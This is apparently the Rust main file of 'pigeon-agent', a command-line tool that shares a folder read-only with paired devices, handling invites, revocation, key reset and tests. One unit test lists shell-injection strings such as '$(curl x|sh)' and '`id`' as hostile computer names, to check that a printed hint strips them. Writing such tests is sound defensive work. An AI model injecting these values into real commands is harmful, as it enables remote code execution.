//! `pigeon-agent`: shares one folder (read-only) with paired devices.
//!
//! - `pigeon-agent share <DIR>`: serve paired devices (and pairing, while an
//!   invite is active). Keep it running.
//! - `pigeon-agent pair [--name NAME] [--ttl HOURS]`: create a single-use
//!   invite: a link (not secret) and a 4-word code (secret, screen only).
//! - `pigeon-agent devices`: list paired devices.
//! - `pigeon-agent revoke <NAME|FINGERPRINT>`: remove a device; a running
//!   agent drops its connections within a second.
//! - `pigeon-agent reset --yes`: new key for this computer; forgets every
//!   pairing.
//! - `pigeon-agent whoami [--name NAME]`: this computer's name and
//!   fingerprint (the same as `pigeon whoami`: one key per computer).
//!
//! The agent only connects outward (to the iroh relay); it does not open any
//! listening socket of its own beyond the UDP sockets iroh uses.

use std::{collections::VecDeque, path::PathBuf, time::Duration};

use anyhow::{Context, Result};
use clap::{Parser, Subcommand};
use iroh::{Endpoint, EndpointAddr, EndpointId, RelayUrl, endpoint::presets};
use pigeon_core::{
    agent::{self, Agent, AgentStorage, Offer, ServeOptions},
    config::{Home, display_path},
    devices::{AGENTS_FILE, AgentList, DEVICES_FILE, Device, DeviceList},
    display_safe, fingerprint,
    identity::{self, Identity},
    keystore::SecretStore,
    pair::{self, Invite},
};
use serde::{Deserialize, Serialize};

/// Keystore entry holding the active invite (it contains the code).
const INVITE_SECRET: &str = "invite";
/// Non-secret status file: the running agent's ID and relay, so `pair` can
/// put a relay hint in the link without starting a second endpoint.
const STATUS_FILE: &str = "agent-status.json";
/// Non-secret list of invite IDs that were used, burned, expired or replaced
/// (W-5): a stale keystore copy can never come back after a restart.
const SPENT_FILE: &str = "spent-invites.json";
/// How many spent invite IDs to remember (oldest dropped first).
const SPENT_KEEP: usize = 256;

#[derive(Parser)]
#[command(name = "pigeon-agent", version, about = "Share a folder with Pigeon")]
struct Cli {
    /// Print details of failed connection attempts.
    #[arg(short, long, global = true)]
    verbose: bool,
    #[command(subcommand)]
    command: Command,
}

#[derive(Subcommand)]
enum Command {
    /// Share DIR (read-only) with paired devices. Keep it running.
    Share {
        /// The folder to share (read-only).
        dir: PathBuf,
    },
    /// Create a single-use pairing invite for one new device.
    Pair {
        /// Name for the device you are pairing, e.g. "Home PC".
        #[arg(long)]
        name: Option<String>,
        /// How long the invite stays valid, in hours (max 24).
        #[arg(long, default_value_t = 12)]
        ttl: u64,
    },
    /// List paired devices.
    Devices,
    /// Remove a paired device (by name or fingerprint).
    Revoke {
        /// Device name or fingerprint, as shown by `pigeon-agent devices`.
        device: String,
    },
    /// Create a new key for this computer and forget every paired device.
    Reset {
        /// Confirm: every paired device has to pair again.
        #[arg(long)]
        yes: bool,
    },
    /// Show this computer's name and fingerprint (one key for sharing and
    /// fetching; `pigeon whoami` shows the same).
    Whoami {
        /// Rename this computer, e.g. "Office Mac".
        #[arg(long)]
        name: Option<String>,
    },
}

#[derive(Serialize, Deserialize)]
struct Status {
    id: EndpointId,
    relay_url: Option<RelayUrl>,
}

#[tokio::main]
async fn main() -> Result<()> {
    let cli = Cli::parse();
    let home = Home::from_env()?;
    match cli.command {
        Command::Share { dir } => share(home, dir, cli.verbose).await,
        Command::Pair { name, ttl } => pair_cmd(home, name, ttl),
        Command::Devices => devices_cmd(&home),
        Command::Revoke { device } => revoke_cmd(&home, &device),
        Command::Reset { yes } => reset_cmd(&home, yes),
        Command::Whoami { name } => whoami_cmd(&home, name.as_deref()),
    }
}

/// This computer's identity (created or migrated on first use); prints what
/// the migration did, once.
fn identity(home: &Home) -> Result<(Identity, Box<dyn SecretStore>)> {
    let (me, store) = home.identity()?;
    for note in &me.notes {
        eprintln!("{note}");
    }
    Ok((me, store))
}

fn whoami_cmd(home: &Home, name: Option<&str>) -> Result<()> {
    let (mut me, store) = identity(home)?;
    if let Some(name) = name {
        me.name = identity::set_name(&home.dir, name)?;
        eprintln!("renamed this computer to {}", display_safe(&me.name));
    }
    let agents = AgentList::load(&home.dir.join(AGENTS_FILE))?;
    print!("{}", me.whoami(store.as_ref(), &agents));
    Ok(())
}

/// Files + keystore persistence for the running agent.
struct Storage {
    home: Home,
    store: Box<dyn SecretStore>,
}

impl Storage {
    fn spent_path(&self) -> PathBuf {
        self.home.dir.join(SPENT_FILE)
    }

    fn load_spent(&self) -> Result<VecDeque<String>> {
        match std::fs::read(self.spent_path()) {
            Ok(bytes) => serde_json::from_slice(&bytes)
                .with_context(|| format!("{SPENT_FILE} is damaged; fix or delete it")),
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(VecDeque::new()),
            Err(e) => Err(e).context(format!("could not read {SPENT_FILE}")),
        }
    }
}

impl AgentStorage for Storage {
    fn device_paired(&self, device: &Device) -> Result<()> {
        // Locked read-modify-write, so a `revoke` made meanwhile is not undone (W-4).
        DeviceList::update(&self.home.dir.join(DEVICES_FILE), |list| {
            list.upsert(device.clone());
            Ok(())
        })
    }

    fn invite_changed(&self, invite_id: &[u8; 16], invite: Option<&Invite>) -> Result<()> {
        // Never overwrite or delete a newer invite from a later `pair`.
        if let Some(stored) = load_invite(self.store.as_ref())?
            && stored.invite_id != *invite_id
        {
            return Ok(());
        }
        match invite {
            Some(invite) => self
                .store
                .set(INVITE_SECRET, &invite.to_secret_bytes()?[..]),
            None => self.store.delete(INVITE_SECRET),
        }
    }

    fn invite_spent(&self, invite_id: &[u8; 16]) -> Result<()> {
        let id = pigeon_core::hex(invite_id);
        let mut spent = self.load_spent()?;
        if !spent.contains(&id) {
            spent.push_back(id);
            while spent.len() > SPENT_KEEP {
                spent.pop_front();
            }
            pigeon_core::config::write_private(&self.spent_path(), &serde_json::to_vec(&spent)?)?;
        }
        Ok(())
    }

    fn is_spent(&self, invite_id: &[u8; 16]) -> bool {
        match self.load_spent() {
            Ok(spent) => spent.contains(&pigeon_core::hex(invite_id)),
            Err(e) => {
                // Fail closed: no pairing until the record is readable again.
                eprintln!("warning: {e:#}; refusing pairing invites until it is fixed");
                true
            }
        }
    }
}

fn load_invite(store: &dyn SecretStore) -> Result<Option<Invite>> {
    match store.get(INVITE_SECRET)? {
        Some(secret) => Ok(Some(Invite::from_secret_bytes(secret.as_bytes())?)),
        None => Ok(None),
    }
}

const OTHER_KEY_HINT: &str = "the stored pairing invite was made for a different agent key \
     (after `pigeon-agent reset`?); run `pigeon-agent pair` again";

async fn share(home: Home, dir: PathBuf, verbose: bool) -> Result<()> {
    let root = dir
        .canonicalize()
        .with_context(|| format!("folder not found: {}", dir.display()))?;
    anyhow::ensure!(root.is_dir(), "not a folder: {}", display_path(&root));
    // Held until this process ends (W-11): `pigeon` warns while it is held,
    // and a second `share` with the same key is refused.
    let _share_lock = agent::hold_share_lock(&home.dir)?;

    // A stable device identity: the same endpoint ID after every restart,
    // and the same one `pigeon` uses on this computer.
    let (me, store) = identity(&home)?;
    eprintln!(
        "this computer: {} (key in {})",
        me.summary(),
        store.describe()
    );
    let key = me.key.clone();
    let devices_path = home.dir.join(DEVICES_FILE);
    let devices = DeviceList::load(&devices_path)?;

    let endpoint = Endpoint::builder(presets::N0)
        .secret_key(key)
        .alpns(vec![pigeon_core::ALPN.to_vec()])
        .bind()
        .await?;
    // Wait until we have a home relay so we are reachable from anywhere.
    if tokio::time::timeout(Duration::from_secs(15), endpoint.online())
        .await
        .is_err()
    {
        eprintln!("warning: relay not reachable yet; other networks may not find this agent");
    }
    write_status(&home, &endpoint.addr());

    let storage = Storage {
        home: home.clone(),
        store: home.store()?,
    };
    let agent = Agent::new(
        endpoint.clone(),
        root.clone(),
        devices.clone(),
        ServeOptions {
            verbose,
            ..Default::default()
        },
        Box::new(storage),
    );
    if let Some(invite) = load_invite(store.as_ref())?
        && agent.offer_invite(invite) == Offer::OtherAgent
    {
        eprintln!("note: {OTHER_KEY_HINT}");
    }
    eprintln!(
        "sharing {} with {} paired device(s) (Ctrl+C to stop)",
        display_path(&root),
        devices.devices.len()
    );
    if devices.devices.is_empty() && !agent.invite_active() {
        eprintln!("no device is paired yet: run `pigeon-agent pair` in another terminal");
    }
    if agent.invite_active() {
        eprintln!("a pairing invite is active");
    }

    let watcher = tokio::spawn(agent::watch(agent.clone(), devices_path, move || {
        load_invite(store.as_ref())
    }));
    tokio::select! {
        res = agent.serve() => res?,
        _ = tokio::signal::ctrl_c() => eprintln!("stopping"),
    }
    watcher.abort();
    endpoint.close().await;
    Ok(())
}

fn write_status(home: &Home, addr: &EndpointAddr) {
    let status = Status {
        id: addr.id,
        relay_url: addr.relay_urls().next().cloned(),
    };
    let result = serde_json::to_vec_pretty(&status)
        .map_err(anyhow::Error::from)
        .and_then(|json| pigeon_core::config::write_private(&home.dir.join(STATUS_FILE), &json));
    if let Err(e) = result {
        eprintln!("warning: could not write {STATUS_FILE}: {e:#}");
    }
}

fn pair_cmd(home: Home, name: Option<String>, ttl_hours: u64) -> Result<()> {
    anyhow::ensure!(
        (1..=24).contains(&ttl_hours),
        "--ttl must be between 1 and 24 hours"
    );
    let (me, store) = identity(&home)?;
    let id = me.id();
    // Relay hint from a running (or the last) `share`, if it used this key.
    let mut addr = EndpointAddr::new(id);
    if let Ok(bytes) = std::fs::read(home.dir.join(STATUS_FILE))
        && let Ok(status) = serde_json::from_slice::<Status>(&bytes)
    {
        if status.id != id {
            // M1: `share` started with another key (e.g. before a `reset`).
            eprintln!(
                "warning: a `pigeon-agent share` that started with another key ({}) may still \
                 be running; stop it and start it again, or this invite will not work.",
                fingerprint(&status.id)
            );
        } else if let Some(url) = status.relay_url {
            addr = addr.with_relay_url(url);
        }
    }
    let name = name.map(|n| n.trim().to_string()).filter(|n| !n.is_empty());
    let ttl = Duration::from_secs(ttl_hours * 3600);
    let (invite, code) = Invite::new(ttl, pair::now_secs(), name.clone())?;
    let invite = invite.for_agent(id);
    // A new invite replaces the old one (only one at a time).
    store.set(INVITE_SECRET, &invite.to_secret_bytes()?[..])?;
    let link = invite.link(addr);

    let who = name.as_deref().unwrap_or("a new device");
    eprintln!(
        "Invite for {} to fetch from this computer, {} (single use, valid {ttl_hours} h, 3 attempts).",
        display_safe(who),
        me.summary()
    );
    eprintln!();
    eprintln!("Link (not secret; you may email it to yourself):");
    println!("link: {link}");
    eprintln!();
    eprintln!("Code (secret: keep it on this screen or a photo, never send it):");
    println!("code: {}", code.reveal());
    eprintln!();
    eprintln!(
        "On the other device run `{}` and type the code.",
        pair_hint(&me.name)
    );
    eprintln!("Keep `pigeon-agent share <DIR>` running; it picks up this invite within seconds.");
    Ok(())
}

/// The command to type on the other device. The name is reduced to
/// characters no shell acts on inside double quotes (W-14), or left out.
fn pair_hint(name: &str) -> String {
    match identity::hint_name(name) {
        Some(name) => format!("pigeon pair <LINK> --name \"{name}\""),
        None => "pigeon pair <LINK>".into(),
    }
}

fn devices_cmd(home: &Home) -> Result<()> {
    let (me, _) = identity(home)?;
    println!("this computer: {}", me.summary());
    let list = DeviceList::load(&home.dir.join(DEVICES_FILE))?;
    if list.devices.is_empty() {
        println!("no paired devices (deny by default). Pair one with `pigeon-agent pair`.");
        return Ok(());
    }
    let now = pair::now_secs();
    println!("{:<10}  {:<14}  name", "fingerprint", "paired");
    for d in &list.devices {
        println!(
            "{:<10}  {:<14}  {}",
            fingerprint(&d.id),
            ago(now, d.paired_at),
            display_safe(&d.name)
        );
    }
    Ok(())
}

fn ago(now: u64, then: u64) -> String {
    let s = now.saturating_sub(then);
    match s {
        0..60 => "just now".into(),
        60..3600 => format!("{} min ago", s / 60),
        3600..86400 => format!("{} h ago", s / 3600),
        _ => format!("{} days ago", s / 86400),
    }
}

fn revoke_cmd(home: &Home, query: &str) -> Result<()> {
    let gone = DeviceList::update(&home.dir.join(DEVICES_FILE), |list| list.remove(query))?;
    println!(
        "revoked {} ({}). A running agent drops its connections within a second.",
        display_safe(&gone.name),
        fingerprint(&gone.id)
    );
    Ok(())
}

fn reset_cmd(home: &Home, yes: bool) -> Result<()> {
    anyhow::ensure!(
        yes,
        "this makes a new key for this computer (sharing and fetching) and forgets every \
         paired device; run again with --yes"
    );
    // Migrate first, so the agents paired with an old client key stay marked.
    let (_, store) = identity(home)?;
    let done = identity::reset(&home.dir, store.as_ref())?;
    store.delete(INVITE_SECRET)?;
    // Locked, like `revoke`: a pairing finishing in `share` cannot bring a
    // device back. The status file stays, so `pair` can warn if a `share`
    // with the old key is still running (M1).
    DeviceList::update(&home.dir.join(DEVICES_FILE), |list| {
        list.devices.clear();
        Ok(())
    })?;
    print!("{}", reset_report(&done));
    // M1: a running `share` keeps the old key in memory.
    println!(
        "If `pigeon-agent share` is running, stop it (Ctrl+C) and start it again now: it still \
         uses the old key, so new invites would not work with it. Then pair your devices again."
    );
    Ok(())
}

/// What `reset` tells the owner (W-12): the new fingerprint, every retired
/// key with the revoke command for the other side, and every remembered
/// agent (all of them knew a retired key).
fn reset_report(done: &identity::Reset) -> String {
    let mut out = format!(
        "reset done: this computer's new fingerprint is {}; every paired device was forgotten.\n",
        fingerprint(&done.key.public())
    );
    if !done.retired.is_empty() {
        let fps: Vec<String> = done.retired.iter().map(fingerprint).collect();
        out.push_str(&format!(
            "Retired keys: {}. On every computer this one was paired with, remove them:\n",
            fps.join(", ")
        ));
        for fp in &fps {
            out.push_str(&format!("  pigeon-agent revoke {fp}\n"));
        }
    }
    if !done.agents.is_empty() {
        out.push_str(
            "These agents this computer fetches from knew a retired key; pair with each again \
             (`pigeon-agent pair` there, `pigeon pair <LINK>` here):\n",
        );
        for a in &done.agents {
            out.push_str(&format!(
                "  {} ({})\n",
                display_safe(&a.name),
                fingerprint(&a.id)
            ));
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use pigeon_core::keystore::MemoryStore;

    fn storage(dir: &std::path::Path) -> Storage {
        Storage {
            home: Home::at(dir.to_path_buf()).unwrap(),
            store: Box::new(MemoryStore::default()),
        }
    }

    /// W-14: the printed `pigeon pair` hint carries no shell syntax from a
    /// hostile computer name (e.g. one employer IT set on a work Mac).
    #[test]
    fn pair_hint_is_safe_to_paste() {
        assert_eq!(
            pair_hint("Office Mac"),
            "pigeon pair <LINK> --name \"Office Mac\""
        );
        for hostile in [
            "$(curl x|sh)",
            "`id`",
            "a\"b",
            "$env:X",
            "%X%",
            "\\\"",
            "!!",
        ] {
            let hint = pair_hint(hostile);
            let quoted = hint.split_once("--name ").map(|(_, n)| n).unwrap_or("\"\"");
            let inner = &quoted[1..quoted.len() - 1];
            assert!(
                !inner.contains(['$', '`', '"', '\\', '%', '!', '(', ')', '|']),
                "{hostile:?} -> {hint}"
            );
        }
        assert_eq!(pair_hint("$()``"), "pigeon pair <LINK>");
    }

    /// W-12: `reset` names every retired key (with the revoke command) and
    /// every remembered agent.
    #[test]
    fn reset_report_lists_all_old_keys_and_agents() {
        let old_device = iroh::SecretKey::from_bytes(&[1; 32]).public();
        let old_client = iroh::SecretKey::from_bytes(&[2; 32]).public();
        let report = reset_report(&identity::Reset {
            key: iroh::SecretKey::from_bytes(&[3; 32]),
            retired: vec![old_device, old_client],
            agents: vec![pigeon_core::devices::PairedAgent {
                id: iroh::SecretKey::from_bytes(&[4; 32]).public(),
                name: "Office Mac".into(),
                relay_url: None,
                paired_at: 1,
                legacy_key: None,
            }],
        });
        for fp in [fingerprint(&old_device), fingerprint(&old_client)] {
            assert!(
                report.contains(&format!("pigeon-agent revoke {fp}")),
                "{report}"
            );
        }
        assert!(report.contains("Office Mac"), "{report}");
    }

    #[test]
    fn storage_never_overwrites_a_newer_invite() {
        let dir = tempfile::tempdir().unwrap();
        let storage = storage(dir.path());
        let (old, _) = Invite::new(pair::DEFAULT_TTL, 1, None).unwrap();
        let (new, _) = Invite::new(pair::DEFAULT_TTL, 1, None).unwrap();
        storage
            .store
            .set(INVITE_SECRET, &new.to_secret_bytes().unwrap()[..])
            .unwrap();
        // The running agent finishing with the old invite must not touch the new one.
        storage.invite_changed(&old.invite_id, None).unwrap();
        storage.invite_changed(&old.invite_id, Some(&old)).unwrap();
        assert_eq!(
            load_invite(storage.store.as_ref()).unwrap(),
            Some(new.clone())
        );
        // Its own invite it does remove.
        storage.invite_changed(&new.invite_id, None).unwrap();
        assert_eq!(load_invite(storage.store.as_ref()).unwrap(), None);
    }

    #[test]
    fn device_paired_keeps_a_concurrent_revoke() {
        let dir = tempfile::tempdir().unwrap();
        let storage = storage(dir.path());
        let path = storage.home.dir.join(DEVICES_FILE);
        let dev = |seed: u8, name: &str| Device {
            id: iroh::SecretKey::from_bytes(&[seed; 32]).public(),
            name: name.into(),
            paired_at: 1,
        };
        storage.device_paired(&dev(1, "a")).unwrap();
        storage.device_paired(&dev(2, "b")).unwrap();
        // `revoke a` from another process edits the file...
        DeviceList::update(&path, |list| list.remove("a").map(|_| ())).unwrap();
        // ...and a later pairing in the running agent must not bring it back.
        storage.device_paired(&dev(3, "c")).unwrap();
        let names: Vec<_> = DeviceList::load(&path)
            .unwrap()
            .devices
            .into_iter()
            .map(|d| d.name)
            .collect();
        assert_eq!(names, ["b", "c"]);
    }

    /// W-5: spent invite IDs survive a restart (a new Storage on the same
    /// home), and an unreadable record fails closed.
    #[test]
    fn spent_invites_are_remembered_and_fail_closed() {
        let dir = tempfile::tempdir().unwrap();
        let (a, _) = Invite::new(pair::DEFAULT_TTL, 1, None).unwrap();
        let (b, _) = Invite::new(pair::DEFAULT_TTL, 1, None).unwrap();
        storage(dir.path()).invite_spent(&a.invite_id).unwrap();
        let after_restart = storage(dir.path());
        assert!(after_restart.is_spent(&a.invite_id));
        assert!(!after_restart.is_spent(&b.invite_id));
        std::fs::write(dir.path().join(SPENT_FILE), b"{ broken").unwrap();
        assert!(after_restart.is_spent(&b.invite_id), "must fail closed");
    }
}
